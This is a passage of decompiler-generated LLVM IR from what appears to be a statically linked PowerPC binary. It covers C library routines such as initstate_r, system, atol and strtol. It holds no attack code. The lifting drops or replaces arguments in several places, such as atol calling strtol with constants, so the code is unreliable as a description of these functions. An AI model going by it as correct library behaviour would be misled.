  ret i32 %v0_1001f918

; uselistorder directives
  uselistorder i32 %v1_1001f8e0, { 1, 0 }
  uselistorder i32 %v2_1001f8dc, { 1, 0 }
  uselistorder i32 %v2_1001f8d0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1001f8bc, { 1, 0 }
  uselistorder i32 %v0_1001f8a4, { 1, 2, 0 }
  uselistorder i32 %v3_1001f88c, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_1001f918, { 1, 0 }
  uselistorder label %dec_label_pc_1001f914, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001f900, { 1, 0 }
  uselistorder label %dec_label_pc_1001f8e4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001f8dc, { 1, 0 }
  uselistorder label %dec_label_pc_1001f8bc, { 1, 0 }
  uselistorder label %dec_label_pc_1001f880, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_1001f930 = icmp ugt i32 %arg2, 127
  %v0_1001f938 = load i32, i32* @lr, align 4
  store i32 %v0_1001f938, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v1_1001f944 = sub i32 255, %arg2
  %v2_1001f944 = sub i32 -1, %arg2
  %not.v5_1001f944 = icmp ugt i32 %v1_1001f944, %v2_1001f944
  %v6_1001f948 = sext i1 %not.v5_1001f944 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_1001f950 = add i32 %tmp, 4
  store i32 %v1_1001f950, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002f0d4.1246 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_1001f968 = sub nsw i32 3, %v6_1001f948
  store i32 %v1_1001f968, i32* @r31, align 4
  br i1 %v2_1001f930, label %dec_label_pc_1001f990, label %dec_label_pc_1001f970

dec_label_pc_1001f970:                            ; preds = %entry
  %v2_1001f95c = icmp ugt i32 %arg2, 31
  %v1_1001f970 = sub i32 63, %arg2
  %not.v5_1001f970 = icmp ugt i32 %v1_1001f970, %v2_1001f944
  %v6_1001f974 = sext i1 %not.v5_1001f970 to i32
  %v1_1001f97c = sub nsw i32 1, %v6_1001f974
  store i32 %v1_1001f97c, i32* @r31, align 4
  br i1 %v2_1001f95c, label %dec_label_pc_1001f990, label %dec_label_pc_1001f984

dec_label_pc_1001f984:                            ; preds = %dec_label_pc_1001f970
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1001f9f0, label %dec_label_pc_1001f990

dec_label_pc_1001f990:                            ; preds = %dec_label_pc_1001f984, %dec_label_pc_1001f970, %entry
  %v0_1001f990 = phi i32 [ 0, %dec_label_pc_1001f984 ], [ %v1_1001f97c, %dec_label_pc_1001f970 ], [ %v1_1001f968, %entry ]
  %v1_1001f990 = mul nsw i32 %v0_1001f990, 4
  store i32 %v1_1001f990, i32* %r0.global-to-local, align 4
  %v2_1001f994 = add i32 %arg3, 12
  %v3_1001f994 = inttoptr i32 %v2_1001f994 to i32*
  store i32 %v0_1001f990, i32* %v3_1001f994, align 4
  %v0_1001f998 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001f998 = load i32, i32* %r11.global-to-local, align 4
  %v2_1001f998 = add i32 %v1_1001f998, %v0_1001f998
  store i32 %v2_1001f998, i32* %r9.global-to-local, align 4
  %v3_1001f99c = inttoptr i32 %v2_1001f998 to i32*
  %v4_1001f99c = load i32, i32* %v3_1001f99c, align 4
  store i32 %v4_1001f99c, i32* %r0.global-to-local, align 4
  %v1_1001f9a0 = add i32 %v2_1001f998, 20
  %v2_1001f9a0 = inttoptr i32 %v1_1001f9a0 to i32*
  %v3_1001f9a0 = load i32, i32* %v2_1001f9a0, align 4
  store i32 %v3_1001f9a0, i32* %r9.global-to-local, align 4
  %v1_1001f9a4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1001f9a4 = add i32 %v1_1001f9a4, 20
  %v3_1001f9a4 = inttoptr i32 %v2_1001f9a4 to i32*
  store i32 %v4_1001f99c, i32* %v3_1001f9a4, align 4
  %v0_1001f9a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001f9a8 = mul i32 %v0_1001f9a8, 4
  store i32 %v1_1001f9a8, i32* %r0.global-to-local, align 4
  %v0_1001f9ac = load i32, i32* %r29.global-to-local, align 4
  %v1_1001f9ac = load i32, i32* %r30.global-to-local, align 4
  %v2_1001f9ac = add i32 %v1_1001f9ac, 8
  %v3_1001f9ac = inttoptr i32 %v2_1001f9ac to i32*
  store i32 %v0_1001f9ac, i32* %v3_1001f9ac, align 4
  %v0_1001f9b0 = load i32, i32* %r29.global-to-local, align 4
  %v1_1001f9b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001f9b0 = add i32 %v1_1001f9b0, %v0_1001f9b0
  store i32 %v2_1001f9b0, i32* %r0.global-to-local, align 4
  %v0_1001f9b4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001f9b4 = load i32, i32* %r30.global-to-local, align 4
  %v2_1001f9b4 = add i32 %v1_1001f9b4, 16
  %v3_1001f9b4 = inttoptr i32 %v2_1001f9b4 to i32*
  store i32 %v0_1001f9b4, i32* %v3_1001f9b4, align 4
  %v0_1001f9b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001f9b8 = load i32, i32* %r30.global-to-local, align 4
  %v2_1001f9b8 = add i32 %v1_1001f9b8, 24
  %v3_1001f9b8 = inttoptr i32 %v2_1001f9b8 to i32*
  store i32 %v0_1001f9b8, i32* %v3_1001f9b8, align 4
  store i32 268564928, i32* @lr, align 4
  %v0_1001f9bc = call i32 @srandom_r()
  %v0_1001f9c0 = load i32, i32* @r31, align 4
  %v3_1001f9c0 = icmp eq i32 %v0_1001f9c0, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1001f9cc = load i32, i32* %r27.global-to-local, align 4
  %v2_1001f9cc = inttoptr i32 %v1_1001f9cc to i32*
  store i32 0, i32* %v2_1001f9cc, align 4
  br i1 %v3_1001f9c0, label %dec_label_pc_1001fa04, label %dec_label_pc_1001f9d4

dec_label_pc_1001f9d4:                            ; preds = %dec_label_pc_1001f990
  %v0_1001f9d4 = load i32, i32* @r30, align 4
  %v1_1001f9d4 = add i32 %v0_1001f9d4, 4
  %v2_1001f9d4 = inttoptr i32 %v1_1001f9d4 to i32*
  %v3_1001f9d4 = load i32, i32* %v2_1001f9d4, align 4
  %v0_1001f9d8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1001f9d8 = sub i32 %v3_1001f9d4, %v0_1001f9d8
  %v4_1001f9dc = sdiv i32 %v2_1001f9d8, 4
  %v1_1001f9e0 = mul i32 %v4_1001f9dc, 5
  %v1_1001f9e4 = load i32, i32* @r31, align 4
  %v2_1001f9e4 = add i32 %v1_1001f9e0, %v1_1001f9e4
  store i32 %v2_1001f9e4, i32* %r0.global-to-local, align 4
  %v1_1001f9e8 = load i32, i32* %r27.global-to-local, align 4
  %v2_1001f9e8 = inttoptr i32 %v1_1001f9e8 to i32*
  store i32 %v2_1001f9e4, i32* %v2_1001f9e8, align 4
  br label %dec_label_pc_1001fa04

dec_label_pc_1001f9f0:                            ; preds = %dec_label_pc_1001f984
  %v0_1001f9f0 = call i32 @__errno_location()
  store i32 %v0_1001f9f0, i32* %r3.global-to-local, align 4
  %v0_1001f9f4 = load i32, i32* %r28.global-to-local, align 4
  %v2_1001f9f4 = inttoptr i32 %v0_1001f9f0 to i32*
  store i32 %v0_1001f9f4, i32* %v2_1001f9f4, align 4
  %v0_1001f9f8 = call i32 @__errno_location()
  %v0_1001f9fc = load i32, i32* %r28.global-to-local, align 4
  %v2_1001f9fc = inttoptr i32 %v0_1001f9f8 to i32*
  store i32 %v0_1001f9fc, i32* %v2_1001f9fc, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001fa04

dec_label_pc_1001fa04:                            ; preds = %dec_label_pc_1001f990, %dec_label_pc_1001f9d4, %dec_label_pc_1001f9f0
  store i32 %v0_1001f938, i32* %r0.global-to-local, align 4
  %v0_1001fa14 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001fa14

; uselistorder directives
  uselistorder i32 %v2_1001f998, { 1, 0, 2 }
  uselistorder i32 %v0_1001f990, { 1, 0 }
  uselistorder i32 %v2_1001f944, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 3, 2 }
  uselistorder i32 ()* @srandom_r, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002f0d4.1246 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_1001fa04, { 2, 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1001fa20 = load i32, i32* @r31, align 4
  %v3_1001fa28 = icmp eq i32 %arg1, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1001fa28, label %dec_label_pc_1001fb58, label %dec_label_pc_1001fa38

dec_label_pc_1001fa38:                            ; preds = %entry
  store i32 268565060, i32* @lr, align 4
  %v2_1001fa40 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268565076, i32* @lr, align 4
  %v2_1001fa50 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 268565092, i32* @lr, align 4
  %v2_1001fa60 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_1001fa60, i32* @r3, align 4
  store i32 268565100, i32* @lr, align 4
  %v1_1001fa68 = call i32 @__vfork(i32 %v2_1001fa60)
  store i32 %v1_1001fa68, i32* @r31, align 4
  %tmp10 = icmp sgt i32 %v1_1001fa68, -1
  br i1 %tmp10, label %dec_label_pc_1001faa0, label %dec_label_pc_1001fa74

dec_label_pc_1001fa74:                            ; preds = %dec_label_pc_1001fa38
  store i32 268565120, i32* @lr, align 4
  %v2_1001fa7c = call i32 @__bsd_signal(i32 3, i32 %v2_1001fa40)
  store i32 268565132, i32* @lr, align 4
  %v2_1001fa88 = call i32 @__bsd_signal(i32 2, i32 %v2_1001fa50)
  store i32 268565144, i32* @lr, align 4
  %v2_1001fa94 = call i32 @__bsd_signal(i32 17, i32 %v2_1001fa60)
  br label %dec_label_pc_1001fb58

dec_label_pc_1001faa0:                            ; preds = %dec_label_pc_1001fa38
  %v3_1001fa6c = icmp eq i32 %v1_1001fa68, 0
  br i1 %v3_1001fa6c, label %dec_label_pc_1001faa4, label %dec_label_pc_1001faf8

dec_label_pc_1001faa4:                            ; preds = %dec_label_pc_1001faa0
  store i32 268565168, i32* @lr, align 4
  %v2_1001faac = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 268565180, i32* @lr, align 4
  %v2_1001fab8 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 268565192, i32* @lr, align 4
  %v2_1001fac4 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_1001faec = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1002e3dc.1149 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002e3e4.1150 to i32), i32 ptrtoint ([3 x i8]* @global_var_1002e3e8.1151 to i32), i32 %arg1, i32 0)
  %v1_1001faf4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_1001faf8

dec_label_pc_1001faf8:                            ; preds = %dec_label_pc_1001faa0, %dec_label_pc_1001faa4
  store i32 268565252, i32* @lr, align 4
  %v2_1001fb00 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 268565264, i32* @lr, align 4
  %v2_1001fb0c = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_1001fb10 = load i32, i32* @r31, align 4
  %v2_1001fb14 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268565284, i32* @lr, align 4
  %v4_1001fb20 = call i32 @wait4(i32 %v0_1001fb10, i32 %v2_1001fb14, i32 0, i32 0)
  %v3_1001fb24 = icmp eq i32 %v4_1001fb20, -1
  br i1 %v3_1001fb24, label %dec_label_pc_1001fb2c, label %dec_label_pc_1001fb30

dec_label_pc_1001fb2c:                            ; preds = %dec_label_pc_1001faf8
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1001fb30

dec_label_pc_1001fb30:                            ; preds = %dec_label_pc_1001faf8, %dec_label_pc_1001fb2c
  store i32 268565308, i32* @lr, align 4
  %v2_1001fb38 = call i32 @__bsd_signal(i32 3, i32 %v2_1001fa40)
  store i32 268565320, i32* @lr, align 4
  %v2_1001fb44 = call i32 @__bsd_signal(i32 2, i32 %v2_1001fa50)
  store i32 268565332, i32* @lr, align 4
  %v2_1001fb50 = call i32 @__bsd_signal(i32 17, i32 %v2_1001fa60)
  %v3_1001fb54 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1001fb58

dec_label_pc_1001fb58:                            ; preds = %entry, %dec_label_pc_1001fa74, %dec_label_pc_1001fb30
  %v0_1001fb68 = phi i32 [ 1, %entry ], [ -1, %dec_label_pc_1001fa74 ], [ %v3_1001fb54, %dec_label_pc_1001fb30 ]
  store i32 %v0_1001fa20, i32* @r31, align 4
  ret i32 %v0_1001fb68

; uselistorder directives
  uselistorder i32 %v1_1001fa68, { 1, 0, 2 }
  uselistorder i32 %v2_1001fa60, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1001fa50, { 1, 0 }
  uselistorder i32 %v2_1001fa40, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_1001fb58, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001fb30, { 1, 0 }
  uselistorder label %dec_label_pc_1001faf8, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  %v2_1001fb74 = call i32 @strtol(i32 0, i32 10)
  ret i32 %v2_1001fb74
}

define i32 @strtol(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 1, i32* @r6, align 4
  %v2_1001fb7c = call i32 @_stdlib_strto_l(i8* inttoptr (i32 1 to i8*))
  ret i32 %v2_1001fb7c
}

define i32 @strtoul(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 0, i32* @r6, align 4
  %v2_1001fb84 = call i32 @_stdlib_strto_l(i8* null)
  ret i32 %v2_1001fb84
}

define i32 @_stdlib_strto_l(i8* %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1001fb98 = load i32, i32* @r4, align 4
  store i32 %v0_1001fb98, i32* @r25, align 4
  %v0_1001fba0 = load i32, i32* @r5, align 4
  store i32 %v0_1001fba0, i32* @r30, align 4
  %v0_1001fba4 = load i32, i32* @r6, align 4
  store i32 %v0_1001fba4, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1001fbac = load i32, i32* @global_var_1004515c, align 4
  br label %dec_label_pc_1001fbb8

dec_label_pc_1001fbb4:                            ; preds = %dec_label_pc_1001fbb8
  %v1_1001fbb4 = add i32 %v0_1001fbec, 1
  store i32 %v1_1001fbb4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001fbb8

dec_label_pc_1001fbb8:                            ; preds = %entry, %dec_label_pc_1001fbb4
  %v0_1001fbec = phi i32 [ %tmp, %entry ], [ %v1_1001fbb4, %dec_label_pc_1001fbb4 ]
  %v1_1001fbb8 = inttoptr i32 %v0_1001fbec to i8*
  %v2_1001fbb8 = load i8, i8* %v1_1001fbb8, align 1
  %v3_1001fbb8 = zext i8 %v2_1001fbb8 to i32
  store i32 %v3_1001fbb8, i32* @r11, align 4
  %v1_1001fbbc = mul nuw nsw i32 %v3_1001fbb8, 2
  %v2_1001fbc0 = add i32 %v1_1001fbbc, %v3_1001fbac
  %v3_1001fbc0 = inttoptr i32 %v2_1001fbc0 to i16*
  %v4_1001fbc0 = load i16, i16* %v3_1001fbc0, align 2
  %v1_1001fbc4 = and i16 %v4_1001fbc0, 32
  %v3_1001fbc4 = icmp eq i16 %v1_1001fbc4, 0
  br i1 %v3_1001fbc4, label %dec_label_pc_1001fbcc, label %dec_label_pc_1001fbb4

dec_label_pc_1001fbcc:                            ; preds = %dec_label_pc_1001fbb8
  %v3_1001fbcc = icmp eq i8 %v2_1001fbb8, 43
  br i1 %v3_1001fbcc, label %dec_label_pc_1001fbec, label %dec_label_pc_1001fbd4

dec_label_pc_1001fbd4:                            ; preds = %dec_label_pc_1001fbcc
  %v3_1001fbd4 = icmp eq i8 %v2_1001fbb8, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_1001fbd4, label %dec_label_pc_1001fbec, label %dec_label_pc_1001fbf0

dec_label_pc_1001fbec:                            ; preds = %dec_label_pc_1001fbcc, %dec_label_pc_1001fbd4
  %storemerge = phi i32 [ 1, %dec_label_pc_1001fbd4 ], [ 0, %dec_label_pc_1001fbcc ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_1001fbec = add i32 %v0_1001fbec, 1
  store i32 %v1_1001fbec, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001fbf0

dec_label_pc_1001fbf0:                            ; preds = %dec_label_pc_1001fbd4, %dec_label_pc_1001fbec
  %v1_1001fbf0 = call i32 @__asm_rlwinm.(i32 %v0_1001fba0, i32 0, i32 28, i32 26)
  %v4_1001fbf0 = icmp eq i32 %v1_1001fbf0, 0
  store i32 %tmp, i32* @r10, align 4
  br i1 %v4_1001fbf0, label %dec_label_pc_1001fbfc, label %dec_label_pc_1001fbf0.dec_label_pc_1001fc38_crit_edge

dec_label_pc_1001fbf0.dec_label_pc_1001fc38_crit_edge: ; preds = %dec_label_pc_1001fbf0
  %v0_1001fc38.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001fc38

dec_label_pc_1001fbfc:                            ; preds = %dec_label_pc_1001fbf0
  %v0_1001fbfc = load i32, i32* %r31.global-to-local, align 4
  %v1_1001fbfc = inttoptr i32 %v0_1001fbfc to i8*
  %v2_1001fbfc = load i8, i8* %v1_1001fbfc, align 1
  %v0_1001fc00 = load i32, i32* @r30, align 4
  %v1_1001fc00 = add i32 %v0_1001fc00, 10
  store i32 %v1_1001fc00, i32* @r30, align 4
  %v3_1001fc04 = icmp eq i8 %v2_1001fbfc, 48
  br i1 %v3_1001fc04, label %dec_label_pc_1001fc0c, label %dec_label_pc_1001fc2c

dec_label_pc_1001fc0c:                            ; preds = %dec_label_pc_1001fbfc
  %v1_1001fc0c = add i32 %v0_1001fbfc, 1
  %v2_1001fc0c = inttoptr i32 %v1_1001fc0c to i8*
  %v3_1001fc0c = load i8, i8* %v2_1001fc0c, align 1
  %v4_1001fc0c = zext i8 %v3_1001fc0c to i32
  store i32 %v1_1001fc0c, i32* %r31.global-to-local, align 4
  %v1_1001fc10 = add i32 %v0_1001fc00, 8
  store i32 %v1_1001fc10, i32* @r30, align 4
  %v1_1001fc14 = or i32 %v4_1001fc0c, 32
  store i32 %v1_1001fc0c, i32* @r10, align 4
  %v3_1001fc1c = icmp eq i32 %v1_1001fc14, 120
  br i1 %v3_1001fc1c, label %dec_label_pc_1001fc24, label %dec_label_pc_1001fc2c

dec_label_pc_1001fc24:                            ; preds = %dec_label_pc_1001fc0c
  %v1_1001fc24 = mul i32 %v1_1001fc10, 2
  store i32 %v1_1001fc24, i32* @r30, align 4
  %v1_1001fc28 = add i32 %v0_1001fbfc, 2
  store i32 %v1_1001fc28, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001fc2c

dec_label_pc_1001fc2c:                            ; preds = %dec_label_pc_1001fc0c, %dec_label_pc_1001fbfc, %dec_label_pc_1001fc24
  %v0_1001fce015 = phi i32 [ %v1_1001fc0c, %dec_label_pc_1001fc24 ], [ %tmp, %dec_label_pc_1001fbfc ], [ %v1_1001fc0c, %dec_label_pc_1001fc0c ]
  %v0_1001fc2c = phi i32 [ %v1_1001fc24, %dec_label_pc_1001fc24 ], [ %v1_1001fc00, %dec_label_pc_1001fbfc ], [ %v1_1001fc10, %dec_label_pc_1001fc0c ]
  %tmp22 = icmp slt i32 %v0_1001fc2c, 17
  br i1 %tmp22, label %dec_label_pc_1001fc38, label %dec_label_pc_1001fc34

dec_label_pc_1001fc34:                            ; preds = %dec_label_pc_1001fc2c
  store i32 16, i32* @r30, align 4
  br label %dec_label_pc_1001fc38

dec_label_pc_1001fc38:                            ; preds = %dec_label_pc_1001fbf0.dec_label_pc_1001fc38_crit_edge, %dec_label_pc_1001fc2c, %dec_label_pc_1001fc34
  %v0_1001fce014 = phi i32 [ %tmp, %dec_label_pc_1001fbf0.dec_label_pc_1001fc38_crit_edge ], [ %v0_1001fce015, %dec_label_pc_1001fc2c ], [ %v0_1001fce015, %dec_label_pc_1001fc34 ]
  %v1_1001fc4c = phi i32 [ %v0_1001fc38.pre, %dec_label_pc_1001fbf0.dec_label_pc_1001fc38_crit_edge ], [ %v0_1001fc2c, %dec_label_pc_1001fc2c ], [ 16, %dec_label_pc_1001fc34 ]
  %v1_1001fc38 = add i32 %v1_1001fc4c, -2
  store i32 0, i32* @r8, align 4
  %v2_1001fc40 = icmp ugt i32 %v1_1001fc38, 34
  br i1 %v2_1001fc40, label %dec_label_pc_1001fcd8, label %dec_label_pc_1001fc48

dec_label_pc_1001fc48:                            ; preds = %dec_label_pc_1001fc38
  %v2_1001fc4c = udiv i32 -1, %v1_1001fc4c
  store i32 %v2_1001fc4c, i32* @r29, align 4
  %v2_1001fc50 = mul i32 %v2_1001fc4c, %v1_1001fc4c
  %v1_1001fc54 = sub i32 -1, %v2_1001fc50
  %v1_1001fc58 = urem i32 %v1_1001fc54, 256
  store i32 %v1_1001fc58, i32* @r27, align 4
  %v0_1001fc64.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001fc64

dec_label_pc_1001fc60:                            ; preds = %dec_label_pc_1001fccc, %dec_label_pc_1001fcb4
  %v1_1001fc68.pre = phi i32 [ %v1_1001fc6c, %dec_label_pc_1001fccc ], [ %v1_1001fc68.pre.pre, %dec_label_pc_1001fcb4 ]
  %v0_1001fc68.pre = phi i32 [ %v2_1001fcd0, %dec_label_pc_1001fccc ], [ %v0_1001fc68.pre.pre, %dec_label_pc_1001fcb4 ]
  %v0_1001fc60 = phi i32 [ %v1_1001fc70, %dec_label_pc_1001fccc ], [ %v0_1001fc60.pre, %dec_label_pc_1001fcb4 ]
  store i32 %v0_1001fc60, i32* @r10, align 4
  br label %dec_label_pc_1001fc64

dec_label_pc_1001fc64:                            ; preds = %dec_label_pc_1001fc48, %dec_label_pc_1001fc60
  %v0_1001fce012 = phi i32 [ %v0_1001fce014, %dec_label_pc_1001fc48 ], [ %v0_1001fc60, %dec_label_pc_1001fc60 ]
  %v0_1001fc70 = phi i32 [ %v0_1001fc64.pre, %dec_label_pc_1001fc48 ], [ %v0_1001fc60, %dec_label_pc_1001fc60 ]
  %v1_1001fc6c = phi i32 [ %v2_1001fc4c, %dec_label_pc_1001fc48 ], [ %v1_1001fc68.pre, %dec_label_pc_1001fc60 ]
  %v0_1001fccc = phi i32 [ 0, %dec_label_pc_1001fc48 ], [ %v0_1001fc68.pre, %dec_label_pc_1001fc60 ]
  %v1_1001fc64 = inttoptr i32 %v0_1001fc70 to i8*
  %v2_1001fc64 = load i8, i8* %v1_1001fc64, align 1
  %v3_1001fc64 = zext i8 %v2_1001fc64 to i32
  %v3_1001fc68 = icmp ugt i32 %v0_1001fccc, %v1_1001fc6c
  %v1_1001fc70 = add i32 %v0_1001fc70, 1
  store i32 %v1_1001fc70, i32* %r31.global-to-local, align 4
  %v1_1001fc74 = add nsw i32 %v3_1001fc64, -48
  %v1_1001fc78 = or i32 %v3_1001fc64, 32
  %v1_1001fc7c = urem i32 %v1_1001fc74, 256
  store i32 %v1_1001fc7c, i32* @r11, align 4
  %tmp23 = icmp ult i32 %v1_1001fc7c, 10
  br i1 %tmp23, label %dec_label_pc_1001fc9c, label %dec_label_pc_1001fc8c

dec_label_pc_1001fc8c:                            ; preds = %dec_label_pc_1001fc64
  store i32 40, i32* @r11, align 4
  %tmp24 = icmp ult i32 %v1_1001fc78, 97
  br i1 %tmp24, label %dec_label_pc_1001fc9c, label %dec_label_pc_1001fc98

dec_label_pc_1001fc98:                            ; preds = %dec_label_pc_1001fc8c
  %v1_1001fc8c = add nsw i32 %v1_1001fc78, -87
  %v1_1001fc98 = urem i32 %v1_1001fc8c, 256
  store i32 %v1_1001fc98, i32* @r11, align 4
  br label %dec_label_pc_1001fc9c

dec_label_pc_1001fc9c:                            ; preds = %dec_label_pc_1001fc8c, %dec_label_pc_1001fc64, %dec_label_pc_1001fc98
  %v1_1001fcd0 = phi i32 [ 40, %dec_label_pc_1001fc8c ], [ %v1_1001fc7c, %dec_label_pc_1001fc64 ], [ %v1_1001fc98, %dec_label_pc_1001fc98 ]
  %v1_1001fc9c = load i32, i32* @r30, align 4
  %v2_1001fc9c = icmp slt i32 %v1_1001fcd0, %v1_1001fc9c
  br i1 %v2_1001fc9c, label %dec_label_pc_1001fca4, label %dec_label_pc_1001fcd8

dec_label_pc_1001fca4:                            ; preds = %dec_label_pc_1001fc9c
  br i1 %v3_1001fc68, label %dec_label_pc_1001fcb4, label %dec_label_pc_1001fca8

dec_label_pc_1001fca8:                            ; preds = %dec_label_pc_1001fca4
  %v1_1001fca8 = load i32, i32* @r27, align 4
  %v0_1001fcac.not = icmp ne i32 %v0_1001fccc, %v1_1001fc6c
  %tmp25 = icmp ule i32 %v1_1001fcd0, %v1_1001fca8
  %or.cond = or i1 %tmp25, %v0_1001fcac.not
  br i1 %or.cond, label %dec_label_pc_1001fccc, label %dec_label_pc_1001fcb4

dec_label_pc_1001fcb4:                            ; preds = %dec_label_pc_1001fca8, %dec_label_pc_1001fca4
  %v0_1001fcb4 = call i32 @__errno_location()
  %v0_1001fcb8 = load i32, i32* @r28, align 4
  %v1_1001fcb8 = load i32, i32* @r26, align 4
  %v2_1001fcb8 = and i32 %v1_1001fcb8, %v0_1001fcb8
  store i32 %v2_1001fcb8, i32* @r28, align 4
  store i32 -1, i32* @r8, align 4
  %v2_1001fcc4 = inttoptr i32 %v0_1001fcb4 to i32*
  store i32 34, i32* %v2_1001fcc4, align 4
  %v0_1001fc60.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1001fc68.pre.pre = load i32, i32* @r8, align 4
  %v1_1001fc68.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001fc60

dec_label_pc_1001fccc:                            ; preds = %dec_label_pc_1001fca8
  %v2_1001fccc = mul i32 %v1_1001fc9c, %v0_1001fccc
  %v2_1001fcd0 = add i32 %v2_1001fccc, %v1_1001fcd0
  store i32 %v2_1001fcd0, i32* @r8, align 4
  br label %dec_label_pc_1001fc60

dec_label_pc_1001fcd8:                            ; preds = %dec_label_pc_1001fc9c, %dec_label_pc_1001fc38
  %v0_1001fce0 = phi i32 [ %v0_1001fce014, %dec_label_pc_1001fc38 ], [ %v0_1001fce012, %dec_label_pc_1001fc9c ]
  %v0_1001fcd8 = load i32, i32* @r25, align 4
  %v3_1001fcd8 = icmp eq i32 %v0_1001fcd8, 0
  br i1 %v3_1001fcd8, label %dec_label_pc_1001fce4, label %dec_label_pc_1001fce0

dec_label_pc_1001fce0:                            ; preds = %dec_label_pc_1001fcd8
  %v2_1001fce0 = inttoptr i32 %v0_1001fcd8 to i32*
  store i32 %v0_1001fce0, i32* %v2_1001fce0, align 4
  br label %dec_label_pc_1001fce4

dec_label_pc_1001fce4:                            ; preds = %dec_label_pc_1001fcd8, %dec_label_pc_1001fce0
  %v0_1001fce4 = load i32, i32* @r26, align 4
  %v3_1001fce4 = icmp eq i32 %v0_1001fce4, 0
  %v0_1001fce8 = load i32, i32* @r28, align 4
  %v1_1001fce8 = sub i32 0, %v0_1001fce8
  %tmp27 = lshr i32 %v1_1001fce8, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1001fd28.pre.pre = load i32, i32* @r8, align 4
  br i1 %v3_1001fce4, label %dec_label_pc_1001fd18, label %dec_label_pc_1001fd00

dec_label_pc_1001fd00:                            ; preds = %dec_label_pc_1001fce4
  %v3_1001fd00 = icmp ugt i32 %v0_1001fd28.pre.pre, %tmp28
  br i1 %v3_1001fd00, label %dec_label_pc_1001fd08, label %dec_label_pc_1001fd18

dec_label_pc_1001fd08:                            ; preds = %dec_label_pc_1001fd00
  %v0_1001fd08 = call i32 @__errno_location()
  %v2_1001fd10 = inttoptr i32 %v0_1001fd08 to i32*
  store i32 34, i32* %v2_1001fd10, align 4
  %v0_1001fd14 = load i32, i32* @r31, align 4
